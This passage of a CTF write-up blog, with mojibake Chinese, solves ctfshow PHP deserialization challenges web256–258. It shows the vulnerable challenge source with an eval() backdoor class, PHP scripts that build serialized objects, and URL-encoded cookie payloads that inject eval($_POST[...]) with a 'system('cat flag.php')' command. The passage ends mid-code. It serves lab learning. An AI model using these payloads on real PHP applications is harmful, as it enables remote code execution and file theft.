function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>å®¡è®¡ä»£ç ï¼Œå‘ç°å¤šäº†ä¸ªusernameå’Œpasswordçš„åˆ¤æ–­ä¸ç›¸ç­‰</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>payload<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">?</span>username<span class="token operator">=</span>K1nako<span class="token operator">&amp;</span>password<span class="token operator">=</span>b</pre></td></tr><tr><td data-num="5"></td><td><pre>Cookie<span class="token punctuation">:</span>user<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>K1nako<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>b<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D</pre></td></tr></table></figure><pre><code>ctfshow&#123;0dc986f3-5835-4f52-899b-d5dfe4ed448e&#125;
</code></pre><h2 id="web257"><a class="anchor" href="#web257">#</a> web257</h2><p>å¼€å§‹ååºåˆ—åŒ–</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-12-02 17:44:47</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-12-02 20:33:07</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">info</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">user</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$code</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="48"></td><td><pre></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>    <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>ä»£ç å®¡è®¡ï¼Œåˆ©ç”¨åé—¨ç±»æ‰§è¡ŒæŒ‡ä»¤</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> </span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">backDoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">info</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">user</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$code</span><span class="token operator">=</span><span class="token string single-quoted-string">'eval($_POST[K1nako]);'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre>payload:</pre></td></tr><tr><td data-num="42"></td><td><pre>?username=a&amp;password=b</pre></td></tr><tr><td data-num="43"></td><td><pre>Cookie:user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A1%3A%22a%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A1%3A%22b%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A21%3A%22eval%28%24_POST%5BK1nako%5D%29%3B%22%3B%7D%7D</pre></td></tr><tr><td data-num="44"></td><td><pre>Post:K1nako=system('cat flag.php');</pre></td></tr></table></figure><pre><code>ctfshow&#123;4de449fd-d8f2-4674-9405-c758daa4d43f&#125;
</code></pre><h2 id="web258"><a class="anchor" href="#web258">#</a> web258</h2><p>å¼€å§‹ååºåˆ—åŒ–</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-12-02 17:44:47</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-12-02 21:38:56</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">info</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">user</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="48"></td><td><pre></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>    <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>å¯¹O:è¿›è¡Œäº†è¿‡æ»¤</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> </span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'backDoor'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">backDoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token 